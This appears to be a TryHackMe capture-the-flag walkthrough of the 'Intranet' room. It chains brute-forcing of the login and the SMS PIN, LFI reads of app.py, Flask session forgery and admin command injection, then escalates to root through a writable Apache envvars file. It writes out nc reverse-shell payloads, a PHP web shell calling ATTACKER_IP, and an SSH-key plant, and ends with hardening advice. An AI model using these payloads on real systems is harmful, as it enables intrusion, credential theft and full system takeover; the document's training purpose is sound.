Walkthrough & Assessment: SecureSolaCoders - Intranet
=====================================================
This technical write-up details the end-to-end security assessment and exploitation path for the SecureSolaCoders: Intranet environment on TryHackMe. The objective is to demonstrate how minor flaws in credential handling, session signature secrets, and local environment configurations can compound into full system compromise (Root access).


- [ Nmap Discovery ]
       │
       ▼
- [ Web Recon (Port 8080) ] ──► CeWL & Rule-based Password Generation ──► Credential Brute-Force (ffuf)
       │
       ▼
- [ SMS 2FA Bypass ] ──► 4-Digit PIN Enumeration ──► Authenticated Access
       │
       ▼
- [ LFI Vulnerability ] ──► Source Code Disclosure (`app.py`) ──► Flask Secret Key Brute-Force
       │
       ▼
- [ Session Forgery ] ──► Admin Impersonation ──► Command Injection (`/admin` debug param)
       │
       ▼
- [ Initial Shell ] ──► User Context: `devops`
       │
       ▼
- [ Lateral Movement ] ──► Writable Web Root (`/var/www/html/`) ──► Shell Escalation to `anders`
       │
       ▼
- [ Privilege Escalation ] ──► Misconfigured Sudo (`apache2 restart`) + Writable `/etc/apache2/envvars`
       │
       ▼
- [ Root Access ] ──► Full System Compromise



1 Reconnaissance & Network Discovery
------------------------------------
An initial host discovery and port scan revealed several open services, including standard remote management ports and two separate HTTP application instances.

- Network Scanning
```
nmap -sS -p- TARGET_IP
```
- Output:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-01 12:08 UTC
Nmap scan report for ip-10-129-168-44.eu-west-3.compute.internal (TARGET_IP)
Host is up (0.00013s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
7/tcp    open  echo
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy
```
- Service version detection was executed against the discovered open ports:
```
nmap -sS -sC -sV -p 7,21,22,23,80,8080 TARGET_IP
```
- Output:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-01 12:08 UTC
Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 12:10 (0:00:15 remaining)
Nmap scan report for ip-10-129-168-44.eu-west-3.compute.internal (TARGET_IP)
Host is up (0.00022s latency).

PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:21:a5:38:0e:a9:2f:02:12:c6:6a:83:d4:22:07:79 (RSA)
|   256 b5:74:bb:6f:fd:15:10:88:8c:ea:1d:99:dc:25:71:0c (ECDSA)
|_  256 f6:fe:d2:11:c2:25:86:b8:50:a8:d1:ab:80:66:fc:3f (ED25519)
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http-proxy Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
...
```
Observations
- Port 80: Apache 2.4.41 web server.
<img width="947" height="184" alt="intranet_0_web_80" src="https://github.com/user-attachments/assets/4f54affb-f784-4a8c-b3bf-8a56ebecbbc3" />

- Port 8080: Werkzeug 2.2.2 (Python 3.8.10 WSGI engine) hosting a web application redirecting to /login.
<img width="956" height="334" alt="intranet_0_web_8080" src="https://github.com/user-attachments/assets/39760a4b-1d71-4f4d-b3f2-2feb9dde9924" />

2 Web Application Directory Enumeration
----------------------------------------
- Directory brute-forcing was conducted on both web services to map exposed endpoints.
```
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/big.txt -z -x .php,.log,.txt,.config
```
- Result: No endpoints discovered on Port 80.

- Directory fuzzing on Port 8080:
```
gobuster dir -u http://TARGET_IP:8080/ -w /usr/share/wordlists/dirb/big.txt -z -x .log,.txt,.py,.js,.json
```
- Output:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,py,js,json,log
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 199] [--> /login]
/application          (Status: 403) [Size: 213]
/external             (Status: 302) [Size: 199] [--> /login]
/home                 (Status: 302) [Size: 199] [--> /login]
/internal             (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 2154]
/logout               (Status: 302) [Size: 199] [--> /login]
/robots.txt           (Status: 200) [Size: 20]
/robots.txt           (Status: 200) [Size: 20]
/sms                  (Status: 302) [Size: 199] [--> /login]
/temporary            (Status: 403) [Size: 213]
===============================================================
Finished
```
- sql injection login error
<img width="951" height="389" alt="intranet_0_web_8080_login_sql_error" src="https://github.com/user-attachments/assets/75f3dce4-7a84-4126-9b14-ef0df7cb0d0f" />

3 Initial Access & Authentication Bypass
-----------------------------------------
- User & Password Profiling

- Inspecting page source and exposed meta information yielded several valid email targets:
```
anders@securesolacoders.no
admin@securesolacoders.no
magnus@securesolacoders.no
devops@securesolacoders.no
```

- Target-tailored wordlists were generated using CeWL to crawl site content:
```
git clone https://github.com/digininja/CeWL.git
cd CeWL
    bundle install --path vendor/bundle
ruby cewl.rb -w wordlist.txt -d 5 -m 8 http://TARGET_IP:8080/
```
- Password mutators were applied via John the Ripper standard rulesets:
```
john --wordlist=wordlist.txt --rules=jumbo --stdout > passwordst.txt
```
- (Alternatively: custom generation script [pass_generate](https://github.com/C09N1T1V3/TryHackMe/blob/main/Scripts/pass_gen.py) run against wordlist.txt)
```
python3 pass_gen.py wordlist.txt
```
Credential Brute-Force
- With target user accounts and generated password wordlists ready, login brute-forcing was executed via ffuf:
```
ffuf -X POST -u http://TARGET_IP:8080/login -w user.txt:w1,passwords.txt:w2 -d "username=w1&password=w2" -H "Content-Type:application/x-www-form-urlencoded" -mc 302
```
Two-Factor (SMS) Authentication Brute-Force
<img width="947" height="333" alt="intranet_0_web_8080_sms_brute" src="https://github.com/user-attachments/assets/d0abcda2-529c-451e-9994-91e6b7c0b1a5" />

- Upon successfully submitting valid user credentials, the site prompts for a 4-digit SMS verification code via /sms. Because rate-limiting and lockout mechanisms were absent, the 4-digit code space (0000 to 9999) was brute-forced using the initial post-login session cookie.
- Inspect Tools -> Storage -> Cookie -> session -> value
```
session=[session_value]
ffuf -X POST -u http://TARGET_IP:8080/sms -w <(seq -w 0 9999) -d "sms=FUZZ" -H "Content-Type:application/x-www-form-urlencoded" -b "session=$session" -fs 1326  
```
<img width="743" height="364" alt="intranet_0_web_8080_sms_brute_code" src="https://github.com/user-attachments/assets/f74b9919-9fa0-4eeb-9d3a-2cbc9abd87a4" />

- (Alternative python automation [sms_brute](https://github.com/C09N1T1V3/TryHackMe/blob/main/Scripts/4digit_brute.py) yielded identical results).

- Passing the SMS prompt redirects the active session to /home (Dashboard access).
<img width="820" height="338" alt="intranet_0_web_8080_dashboard" src="https://github.com/user-attachments/assets/af27461b-33be-4989-8576-7834aaea9f95" />


4 Local File Inclusion (LFI) & Source Code Disclosure
----------------------------------------------------
- The authenticated /internal endpoint fetches local news/directory assets using POST parameters. Fuzzing parameters against payload lists exposed an unvalidated Local File Inclusion (LFI) vulnerability.
```
session=[session_value]
ffuf -X POST -u http://TARGET_IP:8080/internal -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -d "news=FUZZ" -H "Content-Type:application/x-www-form-urlencoded" -H "cookie:session=$session" -fc 500
```
System Inspection via LFI
- System user lists and running process command lines were extracted using curl:
```
curl -X POST http://TARGET_IP:8080/internal -d "news=../../etc/passwd" -H "Content-Type:application/x-www-form-urlencoded" -H "cookie:session=$session" -o passwd

curl -X POST http://TARGET_IP:8080/internal -d "news=../../proc/self/cmdline" -H "Content-Type:application/x-www-form-urlencoded" -H "cookie:session=$session" -o cmdline
```
- The process command-line payload identified the underlying web service binary path: /usr/bin/python3 /home/devops/app.py
<img width="723" height="323" alt="intranet_0_web_8080_internal_lfi" src="https://github.com/user-attachments/assets/1c330535-d63a-453a-af5a-598bd7416e6f" />

Source Code Extraction (app.py)
- Reading the Python application script revealed critical session key initialization logic and an administrative remote command execution path:
```
curl -X POST http://TARGET_IP:8080/internal -d "news=../../home/devops/app.py" -H "Content-Type:application/x-www-form-urlencoded" -H "cookie:session=$session" -o app.py
```
- cat app.py key snippets:
```
key = &#34;secret_key_&#34; + str(random.randrange(100000,999999))
app.secret_key = str(key).encode()

@app.route(&#34;/admin&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def admin():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if session.get(&#34;username&#34;) == &#34;admin&#34;:

                        if request.method == &#34;POST&#34;:
                                os.system(request.form[&#34;debug&#34;])
                                return render_template(&#34;admin.html&#34;)

                        current_ip = request.remote_addr
                        current_time = strftime(&#34;%Y-%m-%d %H:%M:%S&#34;, gmtime())

                        return render_template(&#34;admin.html&#34;, current_ip=current_ip, current_time=current_time)
                else:
                        return abort(403)
```
5 Session Forgery
-------------------------------------
Flask Secret Key Crack & Cookie Signing
- The source code confirmed app.secret_key follows a predictable pattern: secret_key_[100000-999999].

- Generate candidate secret keys space:
```
for i in $(seq 100000 999999); do echo "secret_key_$i"; done > keylist.txt
```
- Crack active cookie signature using flask-unsign:
```
pip3 install flask-unsign
flask-unsign --unsign --cookie < session.txt --wordlist=keylist.txt 
```
- Output:
```
[*] Session decodes to: {'logged_in': True, 'username': 'anders'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 485376 attempts
'secret_key_585276'
```
- Forge administrative session payload (username: admin):
```
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret_key_585276'
```
- Generated Session: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.apfCTQ.MQWwfuyE-jgp6zSMdgkM0PYR6WQ
```
curl -X POST http://10.129.129.84:8080/admin -d "debug=whoami" -H "Content-Type:application/x-www-form-urlencoded" -b "session=$session"
```
6 Remote Code Execution (RCE)
---------------------------
The /admin endpoint directly executes commands submitted through the debug parameter via os.system().

- Initialize local reverse listener:
```
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```
- Send reverse shell payload via administrative endpoint:
```
shell=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.129.69.212%204444%20%3E%2Ftmp%2Ff
session=[session_value] #generated through flask-unsign
curl -X POST http://10.129.129.84:8080/admin -d "debug=$shell" -H "Content-Type:application/x-www-form-urlencoded" -b "session=$session"
```
- Access Gained: Operational shell established under devops user context.
<img width="893" height="365" alt="intranet_1_devops_user" src="https://github.com/user-attachments/assets/f4dbabd6-fb0e-4eb8-9e13-9c8f1280bd79" />


7 Lateral Movement to User anders
---------------------------------
Enumeration under devops showed write permissions over Apache's document root on port 80 (/var/www/html/), which runs under user anders.
```
getent passwd anders devops
getent group anders devops
getent group sudo
find / -xdev -type d -user anders 2>/dev/null
find / -type d -writable 2>/dev/null
ps aux | grep apache2
```
<img width="656" height="241" alt="intranet_1_devops_enum" src="https://github.com/user-attachments/assets/caa9e05c-0a22-46bb-8472-d4aef5984678" />

Web Shell Deployment & Lateral Pivot
- Inject PHP payload into /var/www/html/index.php:
```
<?php exec("busybox nc ATTACKER_IP 4001 -e bash"); ?>
```
- Catch session on secondary listener (rlwrap nc -lvnp 4001):
```
curl -s http://10.129.133.238:80/index.php
```
- Maintain persistent interactive access by planting SSH Key:
```
ssh-keygen -t rsa -b 2048 -f anders_rsa
```
- Append contents of anders_rsa.pub into /home/anders/.ssh/authorized_keys.
```
ssh anders@TARGET_IP -i anders_rsa
```
<img width="892" height="358" alt="intranet_2_anders_user" src="https://github.com/user-attachments/assets/f1622349-6a4d-411d-90c4-35694686a72b" />

8 Privilege Escalation to Root
------------------------------
Sudo configuration enumeration for user anders exposed unrestricted service restart privileges:
```
sudo -l
```
- Output:
```
User anders may run the following commands on ip-10-129-133-238:
    (ALL) NOPASSWD: /sbin/service apache2 restart
```
Environment File Modification Attack
- System searches identified writable permissions on /etc/apache2/envvars, which is sourced whenever apache2 is managed via /sbin/service.
```
find / -writable 2>/dev/null
```
- Edit /etc/apache2/envvars:
```
vi /etc/apache2/envvars
```
- Inject reverse shell payload into envvars:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.129.69.212 5454 >/tmp/f
```
- Catch incoming root shell by triggering Apache service restart:
```
sudo /sbin/service apache2 restart
```
<img width="547" height="251" alt="intranet_2_root_user" src="https://github.com/user-attachments/assets/4008f20e-f607-47d8-8dbf-f4d751269fea" />


Security Recommendations
--------------------------
* Harden Session Key Generation
Replace weak `random.randrange` key generation with Python's `secrets` module (e.g., `secrets.token_hex(32)`) to prevent offline session forgery.
* Eliminate Arbitrary Command Execution
Remove `os.system()` calls driven by user input in `/admin`. Replace debug functionality with native, parameterized logic.
* Sanitize File Path Validation
Sanitize parameters on `/internal` to prevent Local File Inclusion (LFI). Validate paths against an allowed base directory or use direct indirect references.
* Enforce Authentication Rate Limiting
Implement strict rate limiting and account lockout mechanisms on the login form and 4-digit SMS PIN verification endpoints.
* Restrict Privilege Escalation Vectors
Restrict `sudo` restart permissions for Apache and lock down file ownership of `/etc/apache2/envvars` to `root:root` with `644` permissions.
